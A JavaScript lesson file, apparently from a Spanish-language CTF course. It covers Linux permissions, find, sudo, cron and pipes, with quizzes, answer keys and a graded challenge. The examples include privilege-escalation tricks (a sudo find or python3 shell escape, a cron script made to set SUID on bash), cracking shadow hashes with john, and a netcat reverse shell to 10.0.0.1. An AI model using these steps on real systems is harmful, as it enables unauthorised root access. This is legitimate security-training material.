            codigo: "# Ver dueño actual:\n$ ls -l flag.txt\n-rw-r--r-- 1 root root 25 Jun 1 flag.txt\n\n# Como root, cambiar dueño:\n$ chown waldo flag.txt\n$ ls -l flag.txt\n-rw-r--r-- 1 waldo root 25 Jun 1 flag.txt\n\n# Cambiar dueño y grupo:\n$ chown waldo:hackers flag.txt\n$ ls -l flag.txt\n-rw-r--r-- 1 waldo hackers 25 Jun 1 flag.txt",
            output: "-rw-r--r-- 1 root root 25 Jun 1 flag.txt\n-rw-r--r-- 1 waldo root 25 Jun 1 flag.txt\n-rw-r--r-- 1 waldo hackers 25 Jun 1 flag.txt"
          },
          pregunta: "¿Qué comando cambia el dueño de archivo.txt al usuario 'hacker' y al grupo 'ctf'?",
          opciones: [
            "chmod hacker:ctf archivo.txt",
            "chown hacker:ctf archivo.txt",
            "chown hacker ctf archivo.txt",
            "owner hacker:ctf archivo.txt"
          ],
          correcta: 1,
          explicacion: "chown usuario:grupo archivo cambia tanto el dueño como el grupo. El formato es siempre usuario:grupo separados por dos puntos. Sin el :grupo, solo cambia el dueño."
        },
        {
          id: "bash-2-4",
          titulo: "find — Buscar archivos",
          teoria: "find es uno de los comandos más poderosos y usados en CTFs.\n\nUso básico:\n• find / -name 'flag.txt' → busca por nombre desde la raíz\n• find . -name '*.txt' → busca .txt en directorio actual\n• find / -type f -name '*.conf' → solo archivos\n• find / -type d -name 'secret' → solo directorios\n• find / -user root → archivos del usuario root\n• find / -perm -4000 → archivos SUID (privilege escalation!)\n• 2>/dev/null → oculta errores de permisos",
          ejemplo: {
            codigo: "# Buscar la flag:\n$ find / -name 'flag.txt' 2>/dev/null\n/home/waldo/flag.txt\n/root/flag.txt\n\n# Buscar archivos SUID (escalada de privilegios):\n$ find / -perm -4000 2>/dev/null\n/usr/bin/sudo\n/usr/bin/passwd\n/usr/bin/find\n\n# Buscar archivos modificados hoy:\n$ find /var/log -mtime 0\n/var/log/auth.log\n\n# Buscar archivos mayores a 1MB:\n$ find / -size +1M 2>/dev/null",
            output: "/home/waldo/flag.txt\n/root/flag.txt\n/usr/bin/sudo\n/usr/bin/passwd\n/usr/bin/find\n/var/log/auth.log"
          },
          pregunta: "En un CTF quieres buscar archivos con permisos SUID para escalar privilegios. ¿Qué comando usas?",
          opciones: [
            "find / -type suid 2>/dev/null",
            "find / -perm -4000 2>/dev/null",
            "ls -suid / 2>/dev/null",
            "find / -escalate 2>/dev/null"
          ],
          correcta: 1,
          explicacion: "find / -perm -4000 busca archivos con el bit SUID activado. SUID significa que el archivo se ejecuta con los permisos del DUEÑO (a menudo root), no del usuario que lo ejecuta. Es uno de los vectores más comunes de privilege escalation."
        },
        {
          id: "bash-2-5",
          titulo: "file y strings — Analizar archivos",
          teoria: "En CTFs muchas veces recibes archivos sin extensión o binarios. Estos comandos te ayudan a analizarlos.\n\n• file archivo → identifica el tipo de archivo\n• strings archivo → extrae texto legible de binarios\n• xxd archivo → muestra en hexadecimal\n• base64 archivo → codifica/decodifica en base64\n\nEsto es análisis forense básico — esencial para los challenges de CTF.",
          ejemplo: {
            codigo: "$ file mystery\nmystery: ELF 64-bit LSB executable, x86-64\n\n$ file imagen.jpg\nimagen.jpg: JPEG image data\n\n# Extraer strings de un binario:\n$ strings /usr/bin/passwd | head -5\n/lib64/ld-linux-x86-64.so.2\nlibpam.so.0\nlibpam_misc.so.0\nlibaudit.so.1\nlibc.so.6\n\n# Buscar una flag en un binario:\n$ strings ctf_binary | grep 'THM'\nTHM{h1dd3n_1n_b1n4ry}",
            output: "mystery: ELF 64-bit LSB executable, x86-64\nimagen.jpg: JPEG image data\nTHM{h1dd3n_1n_b1n4ry}"
          },
          pregunta: "Tienes un archivo binario y sospechas que contiene una flag. ¿Qué comando extrae texto legible del binario?",
          opciones: ["cat binario", "read binario", "strings binario", "text binario"],
          correcta: 2,
          explicacion: "strings extrae todas las secuencias de caracteres imprimibles de un archivo binario. En CTFs de reverse engineering y forensics, strings archivo | grep 'FLAG\\|THM\\|CTF' es el primer paso para buscar flags ocultas."
        },
        {
          id: "bash-2-6",
          titulo: "less y more — Ver archivos grandes",
          teoria: "cat muestra todo el archivo de golpe. Para archivos grandes usa less.\n\n• less archivo → navega el archivo\n• more archivo → versión más simple\n\nNavegación en less:\n• flechas o j/k → línea por línea\n• Espacio → página siguiente\n• b → página anterior\n• /término → buscar\n• n → siguiente resultado\n• q → salir\n• G → ir al final\n• g → ir al inicio",
          ejemplo: {
            codigo: "# Ver un log grande:\n$ less /var/log/syslog\n# [Se abre el visor]\n# Navega con flechas\n# Busca con /error\n# Sale con q\n\n# Equivalente con more:\n$ more /var/log/auth.log\n# Solo avanza, no retrocede\n\n# Truco: less + búsqueda automática\n$ less +/Failed /var/log/auth.log\n# Abre y va directo a la primera línea con 'Failed'",
            output: "Jun  1 10:00:01 kali sshd[1234]: Failed password for root\nJun  1 10:00:02 kali sshd[1234]: Failed password for admin"
          },
          pregunta: "Dentro de less, ¿qué tecla usas para BUSCAR un término?",
          opciones: ["Ctrl+F", "b", "/", "s"],
          correcta: 2,
          explicacion: "En less, escribes / seguido del término a buscar y Enter. Presiona n para ir al siguiente resultado y N para el anterior. Es igual a la búsqueda en vim y en los manuales de man."
        },
        {
          id: "bash-2-7",
          titulo: "ln — Enlaces simbólicos",
          teoria: "Los enlaces simbólicos son como accesos directos en Windows — apuntan a otro archivo.\n\n• ln -s origen enlace → crea enlace simbólico\n• ln origen enlace → crea enlace duro (hard link)\n\nEn CTFs: los enlaces simbólicos pueden ser vectores de ataque (symlink attacks). Si un proceso crea archivos como root en /tmp y sigue symlinks, puedes apuntar ese archivo a /etc/passwd.",
          ejemplo: {
            codigo: "# Crear enlace simbólico:\n$ ln -s /etc/passwd mi_passwd\n$ ls -la mi_passwd\nlrwxrwxrwx 1 waldo waldo 11 Jun 1 mi_passwd -> /etc/passwd\n\n# Leer a través del enlace:\n$ cat mi_passwd\nroot:x:0:0:root:/root:/bin/bash\n\n# Ver a qué apunta un enlace:\n$ readlink mi_passwd\n/etc/passwd\n\n# Enlace roto (si el original no existe):\n$ ln -s /ruta/inexistente broken_link",
            output: "lrwxrwxrwx 1 waldo waldo 11 Jun 1 mi_passwd -> /etc/passwd\nroot:x:0:0:root:/root:/bin/bash\n/etc/passwd"
          },
          pregunta: "¿Cómo se identifica un enlace simbólico en la salida de ls -la?",
          opciones: [
            "Empieza con s en los permisos",
            "Empieza con l en los permisos y muestra -> destino",
            "Tiene permisos 777",
            "Tiene el símbolo @ al final del nombre"
          ],
          correcta: 1,
          explicacion: "Los enlaces simbólicos empiezan con 'l' en los permisos (lrwxrwxrwx) y muestran el destino con ->. Por ejemplo: 'mi_passwd -> /etc/passwd'. En CTFs busca enlaces simbólicos como parte del reconocimiento del sistema."
        },
        {
          id: "bash-2-8",
          titulo: "df y du — Espacio en disco",
          teoria: "Para analizar el uso del disco:\n\n• df -h → espacio disponible en particiones (human readable)\n• du -sh directorio → tamaño de un directorio\n• du -sh * → tamaño de cada elemento en el directorio actual\n• du -sh /* 2>/dev/null → tamaño de directorios en raíz\n\nEn CTFs: si buscas archivos grandes o sospechosos, du te ayuda a encontrar qué directorio tiene datos inusuales.",
          ejemplo: {
            codigo: "$ df -h\nFilesystem      Size  Used Avail Use% Mounted on\n/dev/sda1        20G   8.5G   11G  44% /\ntmpfs           2.0G     0  2.0G   0% /dev/shm\n\n$ du -sh /var/log\n256M    /var/log\n\n$ du -sh /home/*\n4.0K    /home/waldo\n128M    /home/suspicious_user",
            output: "Filesystem      Size  Used Avail Use% Mounted on\n/dev/sda1        20G   8.5G   11G  44% /\n4.0K    /home/waldo\n128M    /home/suspicious_user"
          },
          pregunta: "¿Qué comando muestra el espacio disponible en las particiones del sistema en formato legible?",
          opciones: ["du -h", "df -h", "free -h", "space -h"],
          correcta: 1,
          explicacion: "df -h (disk free, human readable) muestra el espacio disponible en cada partición montada. du mide el uso de directorios específicos. En pentesting, df -h te da contexto del sistema y du ayuda a encontrar datos grandes o sospechosos."
        },
        {
          id: "bash-2-9",
          titulo: "ps — Procesos del sistema",
          teoria: "ps muestra los procesos que están corriendo.\n\nOpciones más usadas:\n• ps aux → todos los procesos con detalles\n• ps -ef → formato alternativo\n• ps aux | grep nombre → busca proceso específico\n• kill PID → termina un proceso\n• kill -9 PID → fuerza la terminación\n• top → monitor en tiempo real\n• htop → versión mejorada de top",
          ejemplo: {
            codigo: "$ ps aux\nUSER       PID %CPU %MEM    VSZ   RSS COMMAND\nroot         1  0.0  0.1  22560  5120 /sbin/init\nroot       456  0.0  0.2  72300  8192 /usr/sbin/sshd\nwaldo     1234  0.1  0.5 123456 20480 bash\n\n# Buscar proceso específico:\n$ ps aux | grep apache\nroot      789  0.0  0.3 apache2\n\n# Matar un proceso:\n$ kill 1234\n$ kill -9 1234  # forzado",
            output: "USER       PID %CPU %MEM    VSZ   RSS COMMAND\nroot         1  0.0  0.1  22560  5120 /sbin/init\nroot       456  0.0  0.2  72300  8192 /usr/sbin/sshd\nwaldo     1234  0.1  0.5 123456 20480 bash\nroot      789  0.0  0.3 apache2"
          },
          pregunta: "¿Qué comando muestra TODOS los procesos corriendo con información detallada?",
          opciones: ["ps", "ps -l", "ps aux", "processes"],
          correcta: 2,
          explicacion: "ps aux muestra todos los procesos (a=todos los usuarios, u=formato usuario, x=incluye procesos sin terminal). Muestra PID, usuario, CPU, memoria y comando. Es esencial en CTFs para ver qué servicios corren y encontrar procesos vulnerables."
        },
        {
          id: "bash-2-10",
          titulo: "sudo — Ejecutar como root",
          teoria: "sudo (superuser do) permite ejecutar comandos con privilegios de root.\n\nUso:\n• sudo comando → ejecuta como root\n• sudo -l → lista qué puedes ejecutar con sudo\n• sudo su → cambia a shell de root\n• sudo -i → shell interactivo de root\n• su usuario → cambia a otro usuario\n\n⚡ En CTFs: sudo -l es SIEMPRE uno de los primeros comandos. Muestra vectores de privilege escalation.",
          ejemplo: {
            codigo: "# Ver qué puedes hacer con sudo:\n$ sudo -l\nMatching Defaults entries for waldo:\n    env_reset, mail_badpass\n\nUser waldo may run the following commands:\n    (ALL : ALL) NOPASSWD: /usr/bin/find\n    (root) /usr/bin/python3\n\n# Exploit: si puedes ejecutar find como root:\n$ sudo find . -exec /bin/sh \\;\n# ¡Ahora eres root!\n# id\nuid=0(root) gid=0(root) groups=0(root)",
            output: "User waldo may run the following commands:\n    (ALL : ALL) NOPASSWD: /usr/bin/find\n    (root) /usr/bin/python3\nuid=0(root) gid=0(root) groups=0(root)"
          },
          pregunta: "En un CTF ejecutas 'sudo -l' y ves que puedes correr /usr/bin/python3 como root. ¿Esto es relevante para qué?",
          opciones: [
            "Para programar en Python",
            "Para instalar paquetes de Python",
            "Para escalar privilegios a root",
            "Para conectarse a internet"
          ],
          correcta: 2,
          explicacion: "Si puedes ejecutar python3 como sudo, puedes escalar privilegios con: sudo python3 -c 'import os; os.system(\"/bin/bash\")'. Esto abre una shell como root. GTFOBins (gtfobins.github.io) lista cómo explotar cada binario con sudo."
        },
        {
          id: "bash-2-11",
          titulo: "which y whereis — Encontrar ejecutables",
          teoria: "Cuando necesitas saber dónde está instalado un programa:\n\n• which comando → ruta del ejecutable que se usa\n• whereis comando → todas las ubicaciones (binario, manual, fuente)\n• type comando → tipo de comando (alias, función, ejecutable)\n• locate archivo → busca en base de datos (más rápido que find)\n\nEn CTFs: which python3 confirma si Python está disponible y qué versión usa el sistema.",
          ejemplo: {
            codigo: "$ which python3\n/usr/bin/python3\n\n$ which nmap\n/usr/bin/nmap\n\n$ whereis nmap\nnmap: /usr/bin/nmap /usr/share/man/man1/nmap.1.gz\n\n$ which nc\n/usr/bin/nc\n\n# Verificar si una herramienta está instalada:\n$ which metasploit 2>/dev/null || echo 'No instalado'\nNo instalado",
            output: "/usr/bin/python3\n/usr/bin/nmap\nnmap: /usr/bin/nmap /usr/share/man/man1/nmap.1.gz\n/usr/bin/nc\nNo instalado"
          },
          pregunta: "¿Qué comando muestra la ruta completa del ejecutable que usa el sistema para 'python3'?",
          opciones: ["find python3", "locate python3", "which python3", "path python3"],
          correcta: 2,
          explicacion: "which python3 busca en los directorios de $PATH y muestra la ruta del primer ejecutable que encuentra. Es más rápido que find y específico para saber qué ejecutable usará el shell cuando escribas un comando."
        },
        {
          id: "bash-2-12",
          titulo: "tar — Comprimir y descomprimir",
          teoria: "tar es el formato estándar de compresión en Linux.\n\nOpciones clave:\n• tar -czf archivo.tar.gz carpeta/ → comprimir con gzip\n• tar -xzf archivo.tar.gz → descomprimir gzip\n• tar -cjf archivo.tar.bz2 carpeta/ → comprimir con bzip2\n• tar -xjf archivo.tar.bz2 → descomprimir bzip2\n• tar -tf archivo.tar.gz → listar contenido sin extraer\n• unzip archivo.zip → descomprimir ZIP",
          ejemplo: {
            codigo: "# Comprimir:\n$ tar -czf backup.tar.gz mis_archivos/\n$ ls -lh backup.tar.gz\n-rw-r--r-- 1 waldo waldo 2.3M Jun 1 backup.tar.gz\n\n# Ver contenido sin extraer:\n$ tar -tf backup.tar.gz\nmis_archivos/\nmis_archivos/flag.txt\nmis_archivos/exploit.py\n\n# Extraer:\n$ tar -xzf backup.tar.gz\n$ ls\nbackup.tar.gz  mis_archivos/",
            output: "-rw-r--r-- 1 waldo waldo 2.3M Jun 1 backup.tar.gz\nmis_archivos/\nmis_archivos/flag.txt\nmis_archivos/exploit.py\nbackup.tar.gz  mis_archivos/"
          },
          pregunta: "¿Qué comando EXTRAE un archivo .tar.gz?",
          opciones: ["tar -czf archivo.tar.gz", "tar -xzf archivo.tar.gz", "tar -tf archivo.tar.gz", "untar archivo.tar.gz"],
          correcta: 1,
          explicacion: "tar -xzf extrae (x=extract, z=gzip, f=file). Recuerda: c=crear, x=extraer, t=listar. La z es para gzip (.gz), la j es para bzip2 (.bz2). En CTFs encontrarás archivos comprimidos que contienen flags o herramientas."
        },
        {
          id: "bash-2-13",
          titulo: "chmod especial — SUID, SGID, Sticky",
          teoria: "Además de rwx, existen bits especiales:\n\n• SUID (4000): el archivo se ejecuta con permisos del dueño\n  → -rwsr-xr-x (la s en lugar de x del owner)\n  → Si el dueño es root y hay SUID, se ejecuta como root\n\n• SGID (2000): similar pero para grupos\n  → -rwxr-sr-x\n\n• Sticky bit (1000): en directorios, solo el dueño puede borrar sus archivos\n  → drwxrwxrwt (la t al final)\n  → /tmp siempre tiene sticky bit",
          ejemplo: {
            codigo: "# Ver archivos con SUID:\n$ ls -la /usr/bin/passwd\n-rwsr-xr-x 1 root root 68208 /usr/bin/passwd\n#    ^ la 's' indica SUID\n\n# /tmp siempre tiene sticky bit:\n$ ls -la / | grep tmp\ndrwxrwxrwt  1 root root 4096 Jun 1 tmp\n#        ^ la 't' es el sticky bit\n\n# Buscar TODOS los SUID (escalada de privilegios):\n$ find / -perm -4000 2>/dev/null\n/usr/bin/sudo\n/usr/bin/passwd\n/usr/bin/find",
            output: "-rwsr-xr-x 1 root root 68208 /usr/bin/passwd\ndrwxrwxrwt  1 root root 4096 Jun 1 tmp\n/usr/bin/sudo\n/usr/bin/passwd\n/usr/bin/find"
          },
          pregunta: "¿Por qué los archivos SUID son importantes en privilege escalation?",
          opciones: [
            "Porque se pueden leer por todos",
            "Porque se ejecutan con los permisos del dueño, que a menudo es root",
            "Porque no se pueden eliminar",
            "Porque están cifrados"
          ],
          correcta: 1,
          explicacion: "SUID hace que el programa se ejecute con los permisos del DUEÑO del archivo (no del usuario que lo ejecuta). Si /usr/bin/find tiene SUID y es de root, ejecutar find te da permisos de root temporalmente. GTFOBins muestra cómo explotar esto."
        },
        {
          id: "bash-2-14",
          titulo: "crontab — Tareas programadas",
          teoria: "cron ejecuta comandos automáticamente en horarios definidos.\n\nUso:\n• crontab -l → ver tareas del usuario actual\n• crontab -e → editar tareas\n• cat /etc/crontab → ver tareas del sistema\n• ls /etc/cron.d/ → ver más tareas\n\nFormato: minuto hora día mes día_semana comando\n\n⚡ En CTFs: las tareas cron mal configuradas son vectores clásicos de privilege escalation. Si root ejecuta un script que tú puedes modificar, tienes escalada.",
          ejemplo: {
            codigo: "$ crontab -l\n# min hr  day mon dow  command\n  0   2   *   *   *   /home/waldo/backup.sh\n  */5 *   *   *   *   /tmp/cleanup.sh\n\n$ cat /etc/crontab\nSHELL=/bin/sh\n17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly\n\n# Si /tmp/cleanup.sh es escribible por ti y lo ejecuta root:\n$ echo 'chmod +s /bin/bash' >> /tmp/cleanup.sh\n# Espera 5 minutos y...\n$ /bin/bash -p\n# ¡Shell de root!",
            output: "  0   2   *   *   *   /home/waldo/backup.sh\n  */5 *   *   *   *   /tmp/cleanup.sh"
          },
          pregunta: "¿Qué comando muestra las tareas programadas del usuario actual?",
          opciones: ["cron -l", "crontab -l", "schedule -l", "at -l"],
          correcta: 1,
          explicacion: "crontab -l lista las tareas cron del usuario actual. En CTFs revisa siempre: crontab -l, cat /etc/crontab, y ls /etc/cron.d/. Busca scripts que root ejecuta automáticamente y que tú puedes modificar — es privilege escalation clásico."
        },
        {
          id: "bash-2-15",
          titulo: "/etc/passwd y /etc/shadow",
          teoria: "Estos dos archivos son los más importantes para entender usuarios en Linux:\n\n/etc/passwd (legible por todos):\n• formato: usuario:x:UID:GID:comentario:home:shell\n• UID 0 = root\n• Shell /bin/false o /sbin/nologin = no puede iniciar sesión\n\n/etc/shadow (solo root):\n• formato: usuario:hash:último_cambio:...\n• Si obtienes este archivo, puedes crackear hashes con hashcat o john",
          ejemplo: {
            codigo: "$ cat /etc/passwd\nroot:x:0:0:root:/root:/bin/bash\nwww-data:x:33:33::/var/www:/usr/sbin/nologin\nwaldo:x:1000:1000::/home/waldo:/bin/bash\n\n# Como root, ver hashes:\n$ cat /etc/shadow\nroot:$6$salt$hash_muy_largo:18000:0:99999:7:::\nwaldo:$6$salt$otro_hash:18500:0:99999:7:::\n\n# Crackear con john:\n$ john --wordlist=/usr/share/wordlists/rockyou.txt shadow.txt",
            output: "root:x:0:0:root:/root:/bin/bash\nwww-data:x:33:33::/var/www:/usr/sbin/nologin\nwaldo:x:1000:1000::/home/waldo:/bin/bash\nroot:$6$salt$hash_muy_largo:18000:0:99999:7:::"
          },
          pregunta: "En /etc/passwd, ¿qué indica un UID de 0?",
          opciones: [
            "Usuario deshabilitado",
            "Usuario con permisos de root",
            "Usuario sin contraseña",
            "Usuario del sistema"
          ],
          correcta: 1,
          explicacion: "UID 0 es root. En Linux los privilegios se basan en el UID, no en el nombre. Si creas un usuario con UID 0, tendrá privilegios de root aunque se llame distinto. En CTFs busca usuarios con UID 0 en /etc/passwd como señal de backdoor."
        },
        {
          id: "bash-2-16",
          titulo: "Redirección avanzada",
          teoria: "La redirección es fundamental en Linux:\n\n• > → redirige stdout a archivo (sobreescribe)\n• >> → redirige stdout a archivo (añade)\n• < → toma stdin de archivo\n• 2> → redirige stderr\n• 2>/dev/null → descarta errores\n• &> → redirige stdout y stderr\n• | → pipe: salida de uno es entrada del siguiente\n\n/dev/null es un 'agujero negro' — lo que se envía ahí desaparece.",
          ejemplo: {
            codigo: "# Guardar resultado de nmap:\n$ nmap -sV 10.10.10.1 > resultado_nmap.txt\n\n# Descartar errores de find:\n$ find / -name flag.txt 2>/dev/null\n\n# Guardar TODO (stdout + stderr):\n$ nmap -sV 10.10.10.1 &> nmap_completo.txt\n\n# Añadir a archivo existente:\n$ echo 'Nueva IP: 10.10.10.2' >> objetivos.txt\n\n# Pipe: buscar en resultado\n$ cat /etc/passwd | grep root",
            output: "/home/waldo/flag.txt\n/root/flag.txt\nroot:x:0:0:root:/root:/bin/bash"
          },
          pregunta: "¿Qué hace 2>/dev/null en un comando?",
          opciones: [
            "Guarda los errores en /dev/null para verlos después",
            "Descarta todos los mensajes de error",
            "Redirige la salida normal a /dev/null",
            "Duplica la salida del comando"
          ],
          correcta: 1,
          explicacion: "2>/dev/null envía el stderr (descriptor 2, mensajes de error) a /dev/null que es un dispositivo que descarta todo. Útil con find cuando hay muchos 'Permission denied'. Solo ves los resultados exitosos, sin spam de errores."
        },
        {
          id: "bash-2-17",
          titulo: "id y whoami — Quién soy",
          teoria: "Comandos básicos de identidad:\n\n• whoami → nombre de usuario actual\n• id → UID, GID y grupos del usuario\n• groups → grupos a los que perteneces\n• w → usuarios conectados y qué hacen\n• who → usuarios conectados\n• last → historial de logins\n\nEn CTFs: después de explotar una vulnerabilidad siempre ejecutas id para confirmar que tienes root (uid=0).",
          ejemplo: {
            codigo: "# Como usuario normal:\n$ whoami\nwaldo\n$ id\nuid=1000(waldo) gid=1000(waldo) groups=1000(waldo),4(adm),24(cdrom)\n\n# Después de escalar privilegios:\n$ whoami\nroot\n$ id\nuid=0(root) gid=0(root) groups=0(root)\n\n# Ver quién está conectado:\n$ w\nUSER     TTY      FROM     LOGIN@   IDLE COMMAND\nwaldo    pts/0    10.0.0.1 10:00    0.00s bash",
            output: "waldo\nuid=1000(waldo) gid=1000(waldo) groups=1000(waldo),4(adm),24(cdrom)\nroot\nuid=0(root) gid=0(root) groups=0(root)"
          },
          pregunta: "Acabas de explotar una vulnerabilidad. ¿Qué comando ejecutas primero para confirmar que tienes privilegios de root?",
          opciones: ["whoami", "sudo -l", "id", "cat /etc/shadow"],
          correcta: 2,
          explicacion: "id muestra toda la información: uid=0(root) confirma que eres root. Aunque whoami también funciona, id es más completo porque muestra todos los grupos. En CTFs siempre ejecutas id después de cada exploit para verificar el nivel de privilegios obtenido."
        },
        {
          id: "bash-2-18",
          titulo: "Operadores de control",
          teoria: "Puedes ejecutar múltiples comandos de forma condicional:\n\n• cmd1 ; cmd2 → ejecuta ambos siempre\n• cmd1 && cmd2 → ejecuta cmd2 solo si cmd1 tuvo éxito\n• cmd1 || cmd2 → ejecuta cmd2 solo si cmd1 falló\n• cmd & → ejecuta en segundo plano\n• (cmd1; cmd2) → ejecuta en subshell\n\nEsto es esencial para scripts y one-liners de hacking.",
          ejemplo: {
            codigo: "# Siempre ejecuta ambos:\n$ mkdir loot ; cd loot\n\n# Solo si nmap termina bien, guarda:\n$ nmap -sV 10.10.10.1 && echo 'Scan completado' > log.txt\n\n# Si falla, intenta alternativa:\n$ nc -e /bin/bash 10.0.0.1 4444 || nc 10.0.0.1 4444 -e /bin/sh\n\n# En segundo plano:\n$ nmap -sV 10.10.10.0/24 &\n[1] 1234\n# Puedes seguir usando la terminal",
            output: "Scan completado\n[1] 1234"
          },
          pregunta: "¿Qué hace el operador && entre dos comandos?",
          opciones: [
            "Ejecuta ambos siempre",
            "Ejecuta el segundo solo si el primero tuvo éxito",
            "Ejecuta el segundo solo si el primero falló",
            "Ejecuta ambos en paralelo"
          ],
          correcta: 1,
          explicacion: "&& es el operador AND lógico — el segundo comando solo se ejecuta si el primero retornó código de salida 0 (éxito). Útil para: compilar && ejecutar, o nmap && procesar_resultados. El operador ; ejecuta siempre sin importar el resultado."
        },
        {
          id: "bash-2-19",
          titulo: "Bash scripts básicos",
          teoria: "Un script de Bash es un archivo de texto con comandos que se ejecutan en secuencia.\n\nEstructura básica:\n• Primera línea: #!/bin/bash (shebang)\n• Comentarios con #\n• Variables: NOMBRE=valor\n• Ejecución: bash script.sh o ./script.sh (con chmod +x)\n\nEn CTFs usarás scripts para automatizar escaneos, ataques de fuerza bruta y explotación.",
          ejemplo: {
            codigo: "#!/bin/bash\n# Mi primer script de reconocimiento\n\nIP=$1  # primer argumento\n\necho '=== Reconocimiento de: '$IP' ==='\n\necho '[*] Ping...'\nping -c 1 $IP > /dev/null && echo 'Host activo' || echo 'Host inactivo'\n\necho '[*] Puertos principales...'\nnmap -sV --top-ports 100 $IP\n\necho '[+] Reconocimiento completado'",
            output: "=== Reconocimiento de: 10.10.10.1 ===\n[*] Ping...\nHost activo\n[*] Puertos principales...\n[+] Reconocimiento completado"
          },
          pregunta: "¿Qué es el shebang (#!/bin/bash) en un script?",
          opciones: [
            "Un comentario decorativo",
            "Le dice al sistema qué intérprete usar para ejecutar el script",
            "El nombre del script",
            "Una variable especial"
          ],
          correcta: 1,
          explicacion: "El shebang (#!) en la primera línea le dice al sistema operativo qué intérprete usar. #!/bin/bash significa 'ejecuta esto con Bash'. #!/usr/bin/python3 sería para Python. Sin el shebang, debes ejecutarlo como: bash script.sh en vez de ./script.sh."
        },
        {
          id: "bash-2-20",
          titulo: "Resumen Mundo 2",
          teoria: "¡Mundo 2 completado! Ahora manejas archivos y permisos como un profesional.\n\n✅ Permisos rwx — entender y leer\n✅ chmod — cambiar permisos (octal y simbólico)\n✅ chown — cambiar dueño\n✅ find — buscar archivos (incluyendo SUID)\n✅ file y strings — analizar archivos\n✅ less — navegar archivos grandes\n✅ ps — ver procesos\n✅ sudo y sudo -l — escalada de privilegios\n✅ /etc/passwd y /etc/shadow\n✅ Redirección y pipes\n✅ Scripts básicos de Bash\n\nEn el desafío final aplicarás todo esto.",
          ejemplo: {
            codigo: "# Checklist de privilege escalation:\n$ id                          # quién soy\n$ sudo -l                     # qué puedo hacer con sudo\n$ find / -perm -4000 2>/dev/null  # archivos SUID\n$ crontab -l                  # tareas programadas\n$ cat /etc/crontab\n$ cat /etc/passwd             # usuarios\n$ ps aux | grep root          # procesos de root\n$ ls -la /home/*/             # archivos de otros usuarios",
            output: "uid=1000(waldo)\n(ALL) NOPASSWD: /usr/bin/find\n/usr/bin/find\n*/5 * * * * root /tmp/cleanup.sh"
          },
          pregunta: "¿Cuál es el primer comando que ejecutas después de obtener acceso a una máquina Linux en un CTF?",
          opciones: ["cat /etc/shadow", "id", "ls -la", "nmap"],
          correcta: 1,
          explicacion: "id te dice inmediatamente quién eres en el sistema. Luego sudo -l para ver oportunidades de escalada, find / -perm -4000 para SUID, y crontab -l para cron jobs. Este orden es la metodología estándar de privilege escalation en CTFs."
        }
      ],
      desafio: {
        titulo: "Desafío Final — Reconocimiento de Permisos",
        descripcion: "Demuestra que entiendes los permisos y la búsqueda de vectores de privilege escalation en un sistema Linux.",
        instrucciones: [
          "Crea un script llamado 'check_privesc.sh' con el shebang #!/bin/bash",
          "El script debe ejecutar: id, sudo -l (con 2>/dev/null) y find / -perm -4000 2>/dev/null",
          "Dale permisos de ejecución al script con chmod +x",
          "El script debe imprimir un encabezado antes de cada sección",
          "Usa echo para separar visualmente cada sección",
          "El script debe guardar los resultados en 'privesc_results.txt'"
        ],
        solucion: `#!/bin/bash
echo '=== PRIVILEGE ESCALATION CHECK ==='
echo ''
echo '[*] Usuario actual:'
id
echo ''
echo '[*] Comandos sudo disponibles:'
sudo -l 2>/dev/null
echo ''
echo '[*] Archivos SUID:'
find / -perm -4000 2>/dev/null
echo ''
echo '[+] Completado'`,
        test: (codigo) => {
          return codigo.includes("#!/bin/bash") &&
                 codigo.includes("id") &&
                 codigo.includes("sudo") &&
                 codigo.includes("find") &&
                 codigo.includes("perm") &&
                 codigo.includes("echo");
        }
      }
    },

    // ─────────────────────────────────────────────
    // MUNDO 3 — PIPES Y FILTROS
    // ─────────────────────────────────────────────
    {
      id: 3,
      nombre: "Pipes y Filtros",
      icon: "🔧",
      color: "#a78bfa",
      descripcion: "grep, sort, cut, awk, sed, wc. Procesa y filtra datos como un pro.",
      bloqueado: false,
      niveles: [
        {
          id: "bash-3-1",
          titulo: "El pipe | — La tubería",
          teoria: "El pipe (|) conecta comandos — la salida de uno se convierte en la entrada del siguiente.\n\nEs el concepto más poderoso de Unix/Linux. Puedes encadenar tantos comandos como quieras.\n\ncmd1 | cmd2 | cmd3 | cmd4\n\nEsto se llama 'pipeline' y te permite construir herramientas complejas combinando comandos simples.",
          ejemplo: {
            codigo: "# Sin pipe (dos pasos):\n$ ps aux > /tmp/procs.txt\n$ grep 'root' /tmp/procs.txt\n\n# Con pipe (un solo comando):\n$ ps aux | grep 'root'\n\n# Pipeline más largo:\n$ cat /etc/passwd | grep '/bin/bash' | cut -d: -f1\nroot\nwaldo\n\n# Contar usuarios con bash:\n$ cat /etc/passwd | grep '/bin/bash' | wc -l\n2",
            output: "root\nwaldo\n2"
          },
          pregunta: "¿Qué hace el operador | (pipe) entre dos comandos?",
          opciones: [
            "Ejecuta ambos comandos en paralelo",
            "Conecta la salida del primero como entrada del segundo",
            "Guarda el resultado en un archivo",
            "Compara las salidas de ambos comandos"
          ],
          correcta: 1,
          explicacion: "El pipe conecta stdout del primer comando con stdin del segundo. Es el concepto más importante de Linux para procesar texto. Permite construir pipelines poderosos: nmap | grep | sort | uniq son combinaciones típicas en pentesting."
        },
        {
          id: "bash-3-2",
          titulo: "grep — Buscar patrones",
          teoria: "grep busca líneas que coincidan con un patrón. Es imprescindible.\n\nOpciones más usadas:\n• grep 'patrón' archivo → busca el patrón\n• grep -i 'patrón' → ignora mayúsculas/minúsculas\n• grep -r 'patrón' directorio/ → búsqueda recursiva\n• grep -v 'patrón' → líneas que NO contienen el patrón\n• grep -n 'patrón' → muestra número de línea\n• grep -c 'patrón' → cuenta coincidencias\n• grep -E 'regex' → expresiones regulares extendidas\n• grep -o 'patrón' → solo muestra la parte que coincide",
          ejemplo: {
            codigo: "# Buscar usuarios con shell bash:\n$ grep '/bin/bash' /etc/passwd\nroot:x:0:0:root:/root:/bin/bash\nwaldo:x:1000:1000::/home/waldo:/bin/bash\n\n# Buscar flag en logs (sin importar mayúsculas):\n$ grep -ri 'THM{' /var/log/ 2>/dev/null\n\n# Buscar IPs en un archivo:\n$ grep -E '[0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}' access.log\n\n# Excluir líneas de comentarios:\n$ grep -v '^#' /etc/ssh/sshd_config",
            output: "root:x:0:0:root:/root:/bin/bash\nwaldo:x:1000:1000::/home/waldo:/bin/bash\n10.10.10.1 - - [01/Jun/2024] GET /flag.txt"
          },
